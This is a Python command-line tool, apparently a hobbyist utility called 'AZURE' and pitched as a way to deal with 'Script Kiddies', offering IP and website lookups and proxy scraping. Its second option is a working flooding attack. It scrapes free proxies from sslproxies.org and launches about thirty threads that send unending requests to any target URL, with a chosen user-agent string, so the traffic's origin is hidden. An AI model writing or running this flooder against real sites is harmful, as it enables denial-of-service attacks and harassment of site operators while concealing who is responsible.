import random, requests, json, socket, threading, time, hashlib, os, binascii, uuid
from requests_html import HTMLSession
from threading import Thread
from random import choice as random_choice

def Menu():
    os.system('cls')
    print("""
     █████╗     ███████╗    ██╗   ██╗    ██████╗     ███████╗
    ██╔══██╗    ╚══███╔╝    ██║   ██║    ██╔══██╗    ██╔════╝
    ███████║      ███╔╝     ██║   ██║    ██████╔╝    █████╗  
    ██╔══██║     ███╔╝      ██║   ██║    ██╔══██╗    ██╔══╝  
    ██║  ██║    ███████╗    ╚██████╔╝    ██║  ██║    ███████╗
    ╚═╝  ╚═╝    ╚══════╝     ╚═════╝     ╚═╝  ╚═╝    ╚══════╝""")
    print("")
    print("Welcome to AZURE! One of the best ways to handle Script Kiddies!")
    print("Please choose an option below!")
    print("")
    print("1) IP Lookup")
    print("2) IP Logger Flood (No VPN Required)")
    print("3) Website Lookup (Find Website IP and other Info)")
    print("4) Get SSL Proxies")
    choice = input(">> ")

    # IP LOOKUP
    if choice == "1":
        os.system('cls')
        print("""
     █████╗     ███████╗    ██╗   ██╗    ██████╗     ███████╗
    ██╔══██╗    ╚══███╔╝    ██║   ██║    ██╔══██╗    ██╔════╝
    ███████║      ███╔╝     ██║   ██║    ██████╔╝    █████╗  
    ██╔══██║     ███╔╝      ██║   ██║    ██╔══██╗    ██╔══╝  
    ██║  ██║    ███████╗    ╚██████╔╝    ██║  ██║    ███████╗
    ╚═╝  ╚═╝    ╚══════╝     ╚═════╝     ╚═╝  ╚═╝    ╚══════╝""")
        print("")
        print("Please enter an IP to track!")
        ip = input("IP: ")
        
        r = requests.get(f'http://extreme-ip-lookup.com/json/{ip}')
        data = r.json()
        print("Here is the information we got!")
        print("")
        print("IP: " + data["query"])
        print("Region: " + data["region"])
        print("City: " + data["city"])
        print("Country: " + data["country"])
        print("Hostname: " + data["ipName"])
        print("ISP: " + data["isp"])
        print("")
        input("Press Enter to go back to the menu!")
        Menu()
      
    # WEBSITE FLOOD (Proxies)
    if choice == "2":
        os.system('cls')
        print("""
     █████╗     ███████╗    ██╗   ██╗    ██████╗     ███████╗
    ██╔══██╗    ╚══███╔╝    ██║   ██║    ██╔══██╗    ██╔════╝
    ███████║      ███╔╝     ██║   ██║    ██████╔╝    █████╗  
    ██╔══██║     ███╔╝      ██║   ██║    ██╔══██╗    ██╔══╝  
    ██║  ██║    ███████╗    ╚██████╔╝    ██║  ██║    ███████╗
    ╚═╝  ╚═╝    ╚══════╝     ╚═════╝     ╚═╝  ╚═╝    ╚══════╝""")
        print("")
        print("Please enter the target site (Include https:// or http://)")
        target = input("URL: ")
        message = input("Message (user-agent): ")

        session = HTMLSession()
        r = session.get('https://www.sslproxies.org/')
        input("Press enter to start!")

        def spam_em(proxy, message):
            try:
                while True:
                    r = requests.get(target, proxies={'https':proxy[0]+':'+proxy[1],'http':proxy[0]+':'+proxy[1]}, headers={"User-Agent":message})
                    print("Request sent from proxy: " + str(proxy[0]+':'+proxy[1]) + " with user-agent: " + message)
            except:
                pass
        
        proxies = list(zip(r.html.xpath('//*[@id="proxylisttable"]/tbody/tr/td[1]/text()'),r.html.xpath('//*[@id="proxylisttable"]/tbody/tr/td[2]/text()'))) 


        for i in range(30):
            Thread(target=spam_em, args=(random_choice(proxies), message,)).start()
        
        spam_em(random_choice(proxies), message) 
        
    
    # WEBSITE LOOKUP 
    if choice == "3":
        os.system('cls')
        print("""
     █████╗     ███████╗    ██╗   ██╗    ██████╗     ███████╗
    ██╔══██╗    ╚══███╔╝    ██║   ██║    ██╔══██╗    ██╔════╝
    ███████║      ███╔╝     ██║   ██║    ██████╔╝    █████╗  
    ██╔══██║     ███╔╝      ██║   ██║    ██╔══██╗    ██╔══╝  
    ██║  ██║    ███████╗    ╚██████╔╝    ██║  ██║    ███████╗
    ╚═╝  ╚═╝    ╚══════╝     ╚═════╝     ╚═╝  ╚═╝    ╚══════╝""")
        print("")
        print("Please enter the website!")
        website = input("Website: ")
        websiteip = socket.gethostbyname(website)
        r = requests.get(f'http://extreme-ip-lookup.com/json/{websiteip}')
        website_data = r.json()

        print("Here is the information we gathered for: " + website + "(" + websiteip + ")")
        print("ISP: " + website_data["isp"])
        print("City: " + website_data["city"])
        print("Hostname (may be blank): " + website_data["ipName"])
        print("Organization: " + website_data["org"])
        print("")
        input("Go back to the main menu!")
        Menu()
    
    # GATHER SSL PROXIES 
    if choice == "4":
      os.system('cls')
      print("""
     █████╗     ███████╗    ██╗   ██╗    ██████╗     ███████╗
    ██╔══██╗    ╚══███╔╝    ██║   ██║    ██╔══██╗    ██╔════╝
    ███████║      ███╔╝     ██║   ██║    ██████╔╝    █████╗  
    ██╔══██║     ███╔╝      ██║   ██║    ██╔══██╗    ██╔══╝  
    ██║  ██║    ███████╗    ╚██████╔╝    ██║  ██║    ███████╗
    ╚═╝  ╚═╝    ╚══════╝     ╚═════╝     ╚═╝  ╚═╝    ╚══════╝""")
      print("(Gathers Proxies from SSLProxies.org)")
      print("")
      enter = input("Press Enter to gather proxies!")

      session = HTMLSession()

      r = session.get('https://www.sslproxies.org/')
      proxies = list(zip(r.html.xpath('//*[@id="proxylisttable"]/tbody/tr/td[1]/text()'),r.html.xpath('//*[@id="proxylisttable"]/tbody/tr/td[2]/text()')))

      for proxy in proxies:
        time.sleep(0.05)
        r = requests.get(f'http://extreme-ip-lookup.com/json/{proxy[0]}')
        proxy_data = r.json()
        proxy_location = proxy_data["country"]
        print("Gathered Proxy: " + proxy[0] + ":" + proxy[1] + " (" + proxy_location + ")")
        f = open("proxies.txt", "a+")
        f.write(proxy[0] + ":" + proxy[1] + "\n")
        f.close()
        print("")

      print("We can't find anymore proxies!")
      print("")
      input("Press Enter to go back to the menu!")
      Menu()

Menu()
